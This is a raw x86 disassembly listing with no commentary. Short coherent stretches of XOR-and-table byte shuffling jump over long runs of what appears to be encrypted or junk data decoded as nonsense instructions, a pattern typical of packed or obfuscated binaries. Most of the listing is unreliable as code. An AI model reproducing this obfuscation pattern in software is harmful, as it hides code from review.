  408d8c:	pop    esp
  408d8d:	cld    
  408d8e:	retf   
  408d8f:	out    dx,al
  408d90:	(bad)  
  408d92:	mov    ah,0x41
  408d94:	mov    edx,DWORD PTR [ebp-0xc]
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	xchg   esp,eax
  408dbb:	mov    BYTE PTR [eax+0x35],0x93
  408dbf:	fidiv  WORD PTR [eax+0x70]
  408dc2:	imul   edi,DWORD PTR [edi+0x70],0x3539f070
  408dc9:	pop    esp
  408dca:	mov    bl,0x95
  408dcc:	push   ecx
  408dcd:	sub    BYTE PTR [esi+ebp*4-0x11],dh
  408dd1:	add    BYTE PTR [ecx],0x86
  408dd4:	jae    0x408e2e
  408dd6:	xor    BYTE PTR [edx],0xdf
  408dd9:	mov    dh,0x8a
  408ddb:	ss ja  0x408e3c
  408dde:	mov    ch,0xb9
  408de0:	or     al,0x15
  408de2:	adc    DWORD PTR [ecx+0x15c891d7],0xe24444f6
  408dec:	xchg   BYTE PTR [eax-0x4e],bh
  408def:	fstp   TBYTE PTR [edi+edi*8-0x67]
  408df3:	push   esp
  408df4:	in     eax,0x8a
  408df6:	gs aad 0x8a
  408df9:	mov    eax,0x73fe80c6
  408dfe:	fiadd  DWORD PTR [ecx]
  408e00:	scas   al,BYTE PTR es:[edi]
  408e01:	add    ah,BYTE PTR [ebp+0x571d789a]
  408e07:	lahf   
  408e08:	xchg   ebp,eax
  408e09:	icebp  
  408e0a:	les    edx,FWORD PTR [edx+0x2630c481]
  408e10:	push   eax
  408e11:	les    eax,FWORD PTR [ecx+0x7d84bdc3]
  408e17:	mov    dl,0xb1
  408e19:	and    esp,DWORD PTR [eax-0x74]
  408e1c:	or     bh,0x6b
  408e1f:	shl    DWORD PTR [esi-0x372e7696],cl
  408e25:	add    esi,ebx
  408e27:	repz leave 
  408e29:	sbb    BYTE PTR [ebx+ecx*8+0xa4dfbb3],0xe4
  408e31:	aam    0x12
  408e33:	ds jge 0x408e27
  408e36:	retf   0x2ae
  408e39:	(bad)  
  408e3a:	les    ebx,FWORD PTR [eax-0x26292850]
  408e40:	push   ebp
  408e41:	imul   eax,edi,0x62
  408e44:	inc    eax
  408e45:	call   0xbde5:0x4339196e
  408e4c:	jp     0x408e12
  408e4e:	xchg   esp,eax
  408e4f:	add    al,0xbb
  408e51:	xor    al,0x25
  408e53:	enter  0x57e1,0x76
  408e57:	es (bad) 
  408e59:	(bad)  
  408e5a:	es int3 
  408e5c:	ss push es
  408e5e:	dec    esp
  408e5f:	mov    ah,0x79
  408e61:	and    BYTE PTR [eax+ecx*8+0x2c108443],bh
  408e68:	and    DWORD PTR [ebx*1-0x41bc3f12],eax
  408e6f:	xor    dl,ch
  408e71:	and    BYTE PTR [esi-0x3f],ch
  408e74:	outs   dx,DWORD PTR ds:[esi]
  408e75:	fistp  DWORD PTR [edi-0x6b]
  408e78:	rcr    DWORD PTR [esi+0x33],cl
  408e7b:	inc    ecx
  408e7c:	sbb    DWORD PTR [ecx-0x1c95dc98],eax
  408e82:	scas   eax,DWORD PTR es:[edi]
  408e83:	or     al,BYTE PTR [eax+0x3d]
  408e86:	dec    edi
  408e87:	sbb    ah,BYTE PTR [edx-0x3215df1e]
  408e8d:	ins    BYTE PTR es:[edi],dx
  408e8e:	call   0x82c3:0x3b3921cb
  408e95:	jnp    0x408ebd
  408e97:	sub    al,0x5c
  408e99:	jecxz  0x408f1a
  408e9b:	xchg   ebx,eax
  408e9c:	fild   QWORD PTR [edi+eax*8]
  408e9f:	cdq    
  408ea0:	xchg   DWORD PTR [edx],ebx
  408ea2:	mov    dl,0x47
  408ea4:	mov    DWORD PTR [ebx+0x6],esp
  408ea7:	dec    edi
  408ea8:	sbb    DWORD PTR [ecx+0x2d],edi
  408eab:	fidiv  DWORD PTR ds:0xe9423202
  408eb1:	js     0x408e41
  408eb3:	mov    dh,0xc6
  408eb5:	mov    al,dl
  408eb7:	mov    bh,0xb9
  408eb9:	push   ss
  408eba:	mov    al,0xcc
  408ebc:	mov    dh,0xe3
  408ebe:	je     0x408eb7
  408ec0:	push   0xffffffa4
  408ec2:	or     DWORD PTR [edi+0x4a],0x59925777
  408ec9:	out    0x7b,eax
  408ecb:	and    al,0xfa
  408ecd:	xor    eax,0x96e98e3d
  408ed2:	push   ds
  408ed3:	outs   dx,DWORD PTR ds:[esi]
  408ed4:	pop    ds
  408ed5:	les    ecx,FWORD PTR [eax-0x72d0bbfe]
  408edb:	hlt    
  408edc:	ins    BYTE PTR es:[edi],dx
  408edd:	sbb    eax,0x5c0252ae
  408ee2:	pop    eax
  408ee3:	inc    eax
  408ee4:	sti    
  408ee5:	jne    0x408ed9
  408ee7:	mov    bh,bl
  408ee9:	cmp    BYTE PTR [ebp-0x262f24f0],dh
  408eef:	inc    edx
  408ef0:	out    0x3b,eax
  408ef2:	xor    DWORD PTR ds:0xb63e4709,esp
  408ef8:	addr16 push cs
  408efa:	into   
  408efb:	mov    esp,cs
  408efd:	sahf   
  408efe:	adc    eax,0xa80aea12
  408f03:	sbb    ebx,DWORD PTR [ebx+0x6c1668f4]
  408f09:	jbe    0x408f18
  408f0b:	jno    0x408f60
  408f0d:	jle    0x408f0d
  408f0f:	mov    al,0x64
  408f11:	pop    ss
  408f12:	mov    al,ds:0x38270510
  408f17:	xor    eax,0xc7f7057
  408f1c:	sub    BYTE PTR [eax],al
  408f1e:	pop    ecx
  408f1f:	mov    edi,0xdfe6ad04
  408f24:	imul   esi,DWORD PTR [ebx+0x5e3e68db],0x6d
  408f2b:	mov    esp,DWORD PTR [esi+edi*4]
  408f2e:	push   0x68
  408f30:	push   esi
  408f31:	xor    eax,0xc363bc5
  408f36:	mov    esp,0x1f4231f7
  408f3b:	arpl   WORD PTR [esi-0x3e],sp
  408f3e:	jae    0x408fa1
  408f40:	sub    ebx,ebp
  408f42:	and    eax,0xccd403c5
  408f47:	sbb    al,0x45
  408f49:	cmp    BYTE PTR [edx+0x2c],0x48
  408f4d:	daa    
  408f4e:	popf   
  408f4f:	test   eax,0xe7eeff04
  408f54:	retf   0xb2ef
  408f57:	adc    eax,0x16323917
  408f5c:	jne    0x408f72
  408f5e:	inc    edx
  408f5f:	mov    ecx,0xef220689
  408f64:	add    ch,BYTE PTR [ecx+0x2790f72d]
  408f6a:	addr16 mov ch,0x49
  408f6d:	push   ebp
  408f6e:	mov    BYTE PTR [edx-0x7cc9d148],dl
  408f74:	sub    esp,eax
  408f76:	sub    esp,DWORD PTR [edi+0x24f34f69]
  408f7c:	sub    eax,0x699454ef
  408f81:	push   eax
  408f82:	push   cs
  408f83:	pop    esp
  408f84:	sub    eax,0x7efa9614
  408f89:	sbb    al,0x55
  408f8b:	fdiv   DWORD PTR [esi]
  408f8d:	lock outs dx,DWORD PTR ds:[esi]
  408f8f:	cs xchg ecx,eax
  408f91:	das    
  408f92:	or     bl,BYTE PTR [edi-0xc2aa0d7]
  408f98:	mov    ds:0x3862608b,al
  408f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f9e:	(bad)  
  408f9f:	call   0x30ef:0xbe8dae36
  408fa6:	pusha  
  408fa7:	sbb    al,0x30
  408fa9:	or     ebx,DWORD PTR [edx-0x9736b0b]
  408faf:	arpl   WORD PTR [edx+0x40],ax
  408fb2:	js     0x408fe2
  408fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fb5:	mov    dl,0x36
  408fb7:	(bad)  
  408fb8:	lahf   
  408fb9:	std    
  408fba:	mov    bh,0x59
  408fbc:	mov    edx,0x8b0f558a
  408fc1:	jge    0x408fb7
  408fc3:	xor    edi,eax
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	xchg   edi,eax
  409005:	push   edx
  409006:	shr    BYTE PTR [edx-0x74],1
  409009:	fdiv   QWORD PTR [eax+0x70]
  40900c:	imul   edi,DWORD PTR [edi+0x70],0xda708a70
  409013:	xchg   edi,eax
  409014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409015:	cdq    
  409016:	test   BYTE PTR [esi+0x51],dh
  409019:	adc    al,0x6e
  40901b:	adc    ecx,DWORD PTR [eax+eax*4-0x585c6c35]
  409022:	cmp    al,0x31
  409024:	adc    al,0x42
  409026:	mov    WORD PTR [ebx+eax*2],?
  409029:	ss inc ebp
  40902b:	enter  0x5012,0xf1
  40902f:	mov    ds:0xfbdea9af,eax
  409034:	inc    edx
  409035:	jbe    0x409041
  409037:	mov    bh,0x89
  409039:	dec    ecx
  40903a:	outs   dx,DWORD PTR ds:[esi]
  40903c:	xchg   ecx,eax
  40903d:	in     al,dx
  40903e:	and    edx,ebp
  409040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409041:	adc    eax,0xfc8bf5a3
  409046:	mov    WORD PTR [eax],ss
  409048:	ss repz aam 0x88
  40904c:	mov    ds:0xecabc9c5,al
  409051:	lahf   
  409052:	cmp    DWORD PTR [ebx+0x15],0x92a60571
  409059:	ret    0x350b
  40905c:	mov    ebp,0x533f8a9
  409061:	ins    DWORD PTR es:[edi],dx
  409062:	inc    esi
  409063:	sub    ebp,DWORD PTR [eax+eax*4]
  409066:	pop    ds
  409067:	imul   edi,DWORD PTR [ebx+ebx*8],0xd
  40906b:	addr16 out 0x81,eax
  40906e:	mov    al,ds:0x2d217f5e
  409073:	push   eax
  409074:	adc    eax,0x2c3d6e1f
  409079:	adc    BYTE PTR [ecx+0x68],al
  40907c:	pop    ss
  40907d:	frstor [ebx+0x5ddf219a]
  409083:	out    dx,eax
  409084:	je     0x40901c
  409086:	pop    ebx
  409087:	xor    ecx,DWORD PTR [ebp-0x54955ee8]
  40908d:	and    BYTE PTR cs:[ecx-0x14],0xda
  409092:	inc    ebp
  409093:	(bad)  [ebp-0x7c]
  409096:	mov    ebp,0x145df500
  40909b:	cmp    al,0x6b
  40909d:	inc    ebx
  40909e:	xor    edx,esp
  4090a0:	test   eax,0xdde2e807
  4090a5:	(bad)  
  4090a6:	mov    esp,0x983a235c
  4090ab:	fisttp DWORD PTR [edi-0x57]
  4090ae:	ss dec eax
  4090b0:	pop    ss
  4090b1:	repnz iret 
  4090b3:	jbe    0x4090ff
  4090b5:	(bad)  
  4090b6:	iret   
  4090b7:	add    eax,DWORD PTR [ecx]
  4090b9:	xor    eax,0x2c40c5b2
  4090be:	sbb    eax,0x6a5781a5
  4090c3:	jg     0x40908e
  4090c5:	adc    cl,ah
  4090c7:	mov    es,WORD PTR [edi+0x2a]
  4090ca:	xchg   esp,eax
  4090cb:	stos   BYTE PTR es:[edi],al
  4090cc:	fnstsw WORD PTR ds:0x20da9927
  4090d2:	arpl   ax,si
  4090d4:	adc    cl,BYTE PTR [esi+0x40]
  4090d7:	and    eax,0x8418e882
  4090dc:	xchg   esp,eax
  4090dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090de:	xchg   esi,eax
  4090df:	shl    BYTE PTR [eax+0x2284eaba],1
  4090e5:	sbb    dh,BYTE PTR [edi+ebx*8]
  4090e8:	jmp    0x72c2fadc
  4090ed:	(bad)  
  4090ee:	scas   al,BYTE PTR es:[edi]
  4090ef:	(bad)  
  4090f0:	in     eax,dx
  4090f1:	jmp    0x6a3b:0x50f944ac
  4090f8:	jns    0x40913a
  4090fa:	mov    ds:0x97352da,eax
  4090ff:	ds xchg edi,eax
  409101:	adc    eax,0x426e62f2
  409106:	lock cmp al,0x1f
  409109:	adc    al,0x74
  40910b:	scas   eax,DWORD PTR es:[edi]
  40910c:	call   0xe4dbf047
  409111:	mov    dl,0x15
  409113:	or     ah,BYTE PTR [esi]
  409115:	jo     0x4090d3
  409117:	out    dx,eax
  409118:	mov    dl,0xde
  40911a:	mov    ebx,0xd88cc7f8
  40911f:	sub    eax,DWORD PTR [ebx]
  409121:	mov    esp,0x9ccc8a28
  409126:	add    esi,DWORD PTR [edi+0x51]
  409129:	mov    ds:0xccc9c787,al
  40912e:	je     0x40915b
  409130:	add    dh,cl
  409132:	xor    eax,0xac2ff3a0
  409137:	int3   
  409138:	and    BYTE PTR [ebp+edi*4-0x17463f4f],bl
  40913f:	mov    al,ds:0x9a6ec3aa
  409144:	adc    eax,0x84954417
  409149:	sbb    eax,0xa549c08f
  40914e:	push   ebp
  40914f:	jl     0x40915f
  409151:	mov    ch,0x27
  409153:	(bad)  
  409154:	xchg   ecx,eax
  409155:	xchg   ecx,eax
  409156:	cld    
  409157:	sti    
  409158:	push   ds
  409159:	imul   esi,DWORD PTR [esp+esi*1-0x45],0x99096f03
  409161:	inc    ebp
  409162:	mov    ds:0x55730c2,eax
  409167:	jg     0x409187
  409169:	je     0x409170
  40916b:	clc    
  40916c:	xor    al,0x78
  40916e:	popf   
  40916f:	or     dh,BYTE PTR [esi+0x3bc5efca]
  409175:	lods   al,BYTE PTR ds:[esi]
  409176:	xchg   edx,eax
  409177:	push   0x40
  409179:	leave  
  40917a:	fmul   QWORD PTR [ecx+0x1d]
  40917d:	mov    eax,ds:0x6fcf467b
  409182:	sub    DWORD PTR [edx],edx
  409184:	mov    WORD PTR [ecx+0x2ab9158a],es
  40918a:	or     al,0xc6
  40918c:	adc    BYTE PTR [ecx-0x51ca6824],bl
  409192:	popf   
  409193:	mov    al,ds:0x5ce4facc
  409198:	pop    ss
  409199:	mov    DWORD PTR [edx+ecx*2+0x4377d1ce],ecx
  4091a0:	test   al,0x3
  4091a2:	inc    esp
  4091a3:	lods   al,BYTE PTR es:[esi]
  4091a5:	pop    es
  4091a6:	popa   
  4091a7:	adc    eax,0x3fae08a1
  4091ac:	sbb    edi,DWORD PTR ds:0x42a41478
  4091b2:	mov    al,ds:0xca6456f7
  4091b7:	sbb    eax,0xe5b2e141
  4091bc:	ret    
  4091bd:	(bad)  
  4091be:	out    dx,eax
  4091bf:	inc    ecx
  4091c0:	xor    al,0xee
  4091c2:	jmp    0x1ac87c25
  4091c7:	in     al,dx
  4091c8:	rol    DWORD PTR [esi-0x5c1994b6],0xf6
  4091cf:	sti    
  4091d0:	dec    ebp
  4091d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d2:	pushf  
  4091d3:	int3   
  4091d4:	sbb    BYTE PTR [edi-0x718f90d6],0x64
  4091db:	inc    edx
  4091dc:	sbb    dh,ah
  4091de:	jg     0x409236
  4091e0:	or     BYTE PTR [edi+0x2f],0xbf
  4091e4:	std    
  4091e5:	push   0xa3d8950b
  4091ea:	lahf   
  4091eb:	or     BYTE PTR [ecx+0x2e],0x85
  4091ef:	inc    ebx
  4091f0:	push   ss
  4091f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f2:	cwde   
  4091f3:	mov    WORD PTR [edx+ebp*8],?
  4091f6:	outs   dx,DWORD PTR ds:[esi]
  4091f7:	mov    al,ds:0x567cff9b
  4091fc:	out    0x3b,eax
  4091fe:	fidivr WORD PTR [eax-0x357c91b6]
  409204:	xchg   esi,eax
  409205:	fisub  DWORD PTR [esi]
  409207:	add    edi,ecx
  409209:	jmp    0x40941d
  40920e:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  409215:	cdq    
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	push   esp
  40921b:	jle    0x409244
  40921d:	sub    BYTE PTR [ebp+0x697070da],al
  409223:	jg     0x409295
  409225:	jo     0x409204
  409227:	push   cs
  409228:	cmp    ah,ch
  40922a:	sahf   
  40922b:	sar    ebx,1
  40922d:	or     BYTE PTR [ebx-0x60],0xe1
  409231:	or     esi,eax
  409233:	scas   eax,DWORD PTR es:[edi]
  409234:	cmp    BYTE PTR [edx-0x475e55ee],ah
  40923a:	xor    ax,0x4f73
  40923e:	bound  edx,QWORD PTR [ebx-0x3908ee68]
  409244:	(bad)  
  409245:	(bad)  
  409246:	mov    eax,0x5ae33289
  40924b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924c:	dec    ebx
  40924d:	xchg   ebp,eax
  40924e:	and    eax,0x300f26c3
  409253:	pop    ecx
  409254:	hlt    
  409255:	mov    al,0xe3
  409257:	sbb    DWORD PTR [edx+0x65],esp
  40925a:	retf   
  40925b:	mov    DWORD PTR [edx],edi
  40925d:	sahf   
  40925e:	lock stos DWORD PTR es:[edi],eax
  409260:	and    ah,dl
  409262:	xchg   ebp,eax
  409263:	mov    ?,WORD PTR [ebp+eiz*2-0x2dc163e]
  40926a:	aaa    
  40926b:	daa    
  40926c:	in     eax,dx
  40926d:	or     eax,0x11015cd1
  409272:	arpl   bx,ax
  409274:	jo     0x409272
  409276:	or     esi,DWORD PTR [ebx-0x722a59b9]
  40927c:	nop
  40927d:	sbb    eax,0xffffff9a
  409280:	sahf   
  409281:	add    DWORD PTR [esi],0x31
  409284:	adc    BYTE PTR [esi-0x29],ch
  409287:	popf   
  409288:	inc    edi
  409289:	out    dx,eax
  40928a:	in     al,dx
  40928b:	aad    0xa7
  40928d:	add    ch,BYTE PTR [ebx]
  40928f:	sahf   
  409290:	mov    edx,0xdca7abfd
  409296:	xchg   esi,eax
  409297:	int    0x6c
  409299:	call   0x762a:0xd2728157
  4092a0:	mov    eax,0x695253f0
  4092a5:	inc    edi
  4092a6:	call   0xa619a0dd
  4092ab:	fisubr WORD PTR [edi]
  4092ad:	mov    ch,0x99
  4092af:	xor    eax,0x9e41d481
  4092b4:	push   ebx
  4092b5:	cmp    BYTE PTR [edi-0x78c429f8],bl
  4092bb:	mov    ah,0x52
  4092bd:	inc    cl
  4092bf:	(bad)  
  4092c0:	xchg   edx,eax
  4092c1:	addr16 test al,0x8f
  4092c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c5:	fcomip st,st(0)
  4092c7:	scas   eax,DWORD PTR es:[edi]
  4092c8:	hlt    
  4092c9:	mov    edi,0x652fb4cd
  4092ce:	pop    ecx
  4092cf:	mov    eax,0xa287d8ab
  4092d4:	mov    ds:0xcd93c8d,eax
  4092d9:	fdiv   QWORD PTR [ebx-0x49]
  4092dc:	test   dl,ch
  4092de:	clc    
  4092df:	mov    dh,0x99
  4092e1:	aaa    
  4092e2:	pushf  
  4092e3:	mov    edi,0x35e3ce32
  4092e8:	push   edx
  4092e9:	jmp    0xd1ff:0x5abdb83a
  4092f0:	dec    ecx
  4092f1:	add    esi,ebx
  4092f3:	test   DWORD PTR [edx-0x62],esp
  4092f6:	push   0x49
  4092f8:	daa    
  4092f9:	mov    WORD PTR [ebx],ss
  4092fb:	sbb    ch,ch
  4092fd:	mov    eax,0x281ecd7b
  409302:	push   edi
  409303:	cmp    al,0x4b
  409305:	stos   BYTE PTR es:[edi],al
  409306:	lods   eax,DWORD PTR ds:[esi]
  409307:	test   eax,0x8b16517a
  40930c:	cmp    al,0x5f
  40930e:	jbe    0x409382
  409310:	push   ds
  409311:	dec    esi
  409312:	sti    
  409313:	sbb    edx,DWORD PTR [ecx-0x54b2be42]
  409319:	test   BYTE PTR [ebx],dh
  40931b:	dec    ecx
  40931c:	inc    esi
  40931d:	sub    al,0xa2
  40931f:	loopne 0x4092a2
  409321:	inc    ebx
  409322:	popa   
  409323:	lahf   
  409324:	test   eax,0xb5c65ae7
  409329:	rol    DWORD PTR [edi],0x6f
  40932c:	in     eax,dx
  40932d:	pushf  
  40932e:	jb     0x409354
  409330:	ret    
  409331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409332:	push   esp
  409333:	xchg   ebx,esi
  409335:	pushf  
  409336:	scas   al,BYTE PTR es:[edi]
  409337:	dec    ebp
  409338:	(bad)  
  409339:	lea    esi,[edi+0x7bfdfb05]
  40933f:	mov    ah,0xe9
  409341:	stc    
  409342:	adc    eax,0xf6848aa3
  409347:	sbb    edi,DWORD PTR [edi]
  409349:	pop    eax
  40934a:	std    
  40934b:	imul   eax,DWORD PTR [edi+0x71672c86],0x60100845
  409355:	adc    BYTE PTR [ebx],dh
  409357:	and    al,0x2d
  409359:	aam    0x4b
  40935b:	xchg   ebp,eax
  40935c:	test   al,0xe9
  40935e:	mov    edx,0xdc8392af
  409363:	cmp    eax,0xae7f5810
  409368:	mov    eax,0x4264f2ce
  40936d:	lea    ebx,[edx-0x61]
  409370:	add    dl,BYTE PTR [ecx-0x6833006f]
  409376:	jnp    0x40933b
  409378:	in     eax,0x5c
  40937a:	arpl   WORD PTR [ebp-0x1f2acad9],cx
  409380:	pop    edx
  409381:	(bad)  
  409383:	add    eax,0x5edb2a
  409388:	and    BYTE PTR [edi-0x2f],bl
  40938b:	or     esp,DWORD PTR [edi-0x5fbb638c]
  409391:	inc    ecx
  409392:	dec    ebx
  409393:	jae    0x40936d
  409395:	nop
  409396:	sub    DWORD PTR [eax],eax
  409398:	int    0xc5
  40939a:	xor    edx,DWORD PTR [edx+0x199edf3c]
  4093a0:	div    DWORD PTR [edx-0x10]
  4093a3:	push   edi
  4093a4:	test   al,0x29
  4093a6:	(bad)  [ecx+0x4b]
  4093a9:	inc    esi
  4093aa:	pop    ebx
  4093ab:	cmp    ch,BYTE PTR [eax]
  4093ad:	(bad)  
  4093af:	mov    eax,0x7cdfd316
  4093b4:	out    dx,eax
  4093b5:	add    edx,DWORD PTR ds:0x662fa32f
  4093bb:	jnp    0x40937a
  4093bd:	push   ss
  4093be:	adc    eax,0xba23dd11
  4093c3:	jmp    0x407636c0
  4093c8:	or     esi,DWORD PTR [edx+0x0]
  4093cb:	sbb    al,0x11
  4093cd:	push   ebp
  4093ce:	mov    ch,0xc3
  4093d0:	pop    ds
  4093d1:	sar    dl,cl
  4093d3:	or     DWORD PTR [ecx+0x5ae166a5],ebp
  4093d9:	pop    ebp
  4093da:	or     edx,DWORD PTR [ebx+0xc]
  4093dd:	sbb    DWORD PTR [ecx+0x69369b42],0xffffffae
  4093e4:	cld    
  4093e5:	dec    ecx
  4093e6:	add    al,0x7
  4093e8:	pusha  
  4093e9:	dec    eax
  4093ea:	inc    eax
  4093eb:	je     0x409447
  4093ed:	call   0x582c:0x93c60687
  4093f4:	inc    ecx
  4093f5:	xor    BYTE PTR [edi+0x7622b95f],bh
  4093fb:	(bad)  
  4093fc:	pop    eax
  4093fd:	repnz test eax,0xe7556373
  409403:	ret    0xebf8
  409406:	mov    bh,0xc8
  409408:	pop    ss
  409409:	and    DWORD PTR [edx+ecx*2+0x67cf6fa5],0x38
  409411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409412:	mov    eax,0x33d33b22
  409417:	shl    BYTE PTR [edx+0x8],1
  40941a:	jb     0x4093d8
  40941c:	xlat   BYTE PTR ds:[ebx]
  40941d:	imul   edx,edi
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx+0x1ab01fed]
  409433:	cld    
  409434:	sahf   
  409435:	(bad)  
  409436:	fdiv   DWORD PTR [eax+0x70]
  409439:	imul   edi,DWORD PTR [edi+0x70],0x6f48b870
  409440:	pop    edx
  409441:	es mov ecx,0x675c3b1e
  409447:	daa    
  409448:	sahf   
  409449:	inc    edx
  40944a:	loop   0x409452
  40944c:	sbb    ebx,eax
  40944e:	shl    BYTE PTR [ebp-0x32421ffd],1
  409454:	shl    BYTE PTR [esi+0x388fe4e1],1
  40945a:	ret    
  40945b:	stos   BYTE PTR es:[edi],al
  40945c:	sbb    al,0x32
  40945e:	cmc    
  40945f:	sbb    BYTE PTR [edx],ah
  409461:	push   edx
  409462:	out    dx,al
  409463:	xor    eax,0x3c00f814
  409468:	sahf   
  409469:	popf   
  40946a:	dec    ebp
  40946b:	push   ds
  40946c:	sahf   
  40946d:	and    eax,edi
  40946f:	int3   
  409470:	fs pop edi
  409472:	mov    ebp,0x30d4e8ce
  409477:	hlt    
  409478:	les    ecx,FWORD PTR [ebx]
  40947a:	fs ret 0x7c5e
  40947e:	ins    BYTE PTR es:[edi],dx
  40947f:	dec    esi
  409480:	lds    edi,FWORD PTR [esi]
  409482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409483:	mov    esp,0xa86eb54d
  409488:	hlt    
  409489:	enter  0xabce,0x6c
  40948d:	mov    ebx,0x2c95b097
  409492:	pop    esi
  409493:	ins    BYTE PTR es:[edi],dx
  409494:	mov    ebp,DWORD PTR [eax]
  409496:	into   
  409497:	test   al,0x92
  409499:	dec    ecx
  40949a:	push   0x76667530
  40949f:	je     0x4094d5
  4094a1:	pop    esi
  4094a2:	(bad)  
  4094a3:	into   
  4094a4:	ins    BYTE PTR es:[edi],dx
  4094a5:	push   ecx
  4094a6:	push   ss
  4094a7:	xchg   esi,eax
  4094a8:	cld    
  4094a9:	adc    ebp,esi
  4094ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094ac:	push   ds
  4094ad:	jg     0x40949b
  4094af:	iret   
  4094b0:	ins    DWORD PTR es:[edi],dx
  4094b1:	xchg   ecx,eax
  4094b2:	scas   eax,DWORD PTR es:[edi]
  4094b3:	pop    edx
  4094b4:	mov    edx,0x4213c0b9
  4094b9:	fwait
  4094ba:	adc    ch,ch
  4094bc:	xlat   BYTE PTR ds:[ebx]
  4094bd:	or     al,0x79
  4094bf:	jne    0x409500
  4094c1:	jp     0x409458
  4094c3:	sahf   
  4094c4:	cwde   
  4094c5:	in     eax,0x29
  4094c7:	jbe    0x4094c6
  4094c9:	cmp    DWORD PTR [ebx-0x46],ebp
  4094cc:	mov    edi,DWORD PTR [ebx+0x66]
  4094cf:	pushf  
  4094d0:	scas   eax,DWORD PTR es:[edi]
  4094d1:	and    DWORD PTR [edx+eax*2+0x49],ebp
  4094d5:	ins    DWORD PTR es:[edi],dx
  4094d6:	cs or  edi,ebx
  4094d9:	jnp    0x4094e5
  4094db:	cmp    ah,BYTE PTR [eax+0x6c]
  4094de:	or     eax,0x859c0fed
  4094e3:	xor    ch,BYTE PTR [edi+0x0]
  4094e6:	jae    0x4094d7
  4094e8:	scas   eax,DWORD PTR es:[edi]
  4094e9:	sub    al,dh
  4094eb:	dec    esi
  4094ec:	test   DWORD PTR [edi-0x2148cf4e],ebp
  4094f2:	add    al,0x16
  4094f4:	cmp    bh,0x1e
  4094f7:	pop    ss
  4094f8:	rol    BYTE PTR [ecx-0x56afc98b],0x5c
  4094ff:	repz or edx,0x54dbb11a
  409506:	aam    0x2
  409508:	fsub   QWORD PTR [edx*4+0x16b00b3e]
  40950f:	jmp    0x971b:0x457b9e21
  409516:	mov    ebp,0x437330b0
  40951b:	dec    ebp
  40951c:	add    eax,0x9a95032d
  409521:	mov    eax,ds:0x852e40ce
  409526:	cmp    edi,DWORD PTR [eax+0x4ecf4361]
  40952c:	mov    ecx,0x64f88b89
  409531:	pop    ebx
  409532:	pop    ss
  409533:	pop    ss
  409534:	jno    0x409538
  409536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409537:	retf   0xe512
  40953a:	mov    ch,0x1a
  40953c:	adc    esp,DWORD PTR [ecx]
  40953e:	push   cs
  40953f:	pop    esp
  409540:	mov    edi,0x1c24c6a3
  409545:	rcr    DWORD PTR [ebx-0x7bbcd782],0xec
  40954c:	les    esp,FWORD PTR [ebx+0x78]
  40954f:	sub    BYTE PTR [edi-0x7d],bl
  409552:	xlat   BYTE PTR ds:[ebx]
  409553:	or     BYTE PTR [ebx],cl
  409555:	std    
  409556:	inc    esi
  409557:	xor    DWORD PTR [ebx],ebx
  409559:	imul   ebx,DWORD PTR [edx],0x3d
  40955c:	stos   BYTE PTR es:[edi],al
  40955d:	add    eax,DWORD PTR [esi+0x75dfb82a]
  409563:	fadd   st(4),st
  409565:	clc    
  409566:	ss add dl,al
  409569:	mov    bh,0x96
  40956b:	das    
  40956c:	(bad)  
  40956e:	add    DWORD PTR [eax+eax*8-0x2110a877],ebp
  409575:	xchg   BYTE PTR [edi+0x1e],ch
  409578:	and    DWORD PTR [eax-0x4d],esp
  40957b:	jno    0x40954a
  40957d:	stos   BYTE PTR es:[edi],al
  40957e:	aaa    
  40957f:	xor    al,ch
  409581:	inc    ebx
  409582:	push   ebp
  409583:	jns    0x4095fa
  409585:	jns    0x4095ff
  409587:	ins    BYTE PTR es:[edi],dx
  409588:	ins    BYTE PTR es:[edi],dx
  409589:	aad    0x2a
  40958b:	jmp    0x4095cb
  40958d:	inc    edi
  40958e:	mov    bh,0x6b
  409590:	ins    BYTE PTR es:[edi],dx
  409591:	int    0x5b
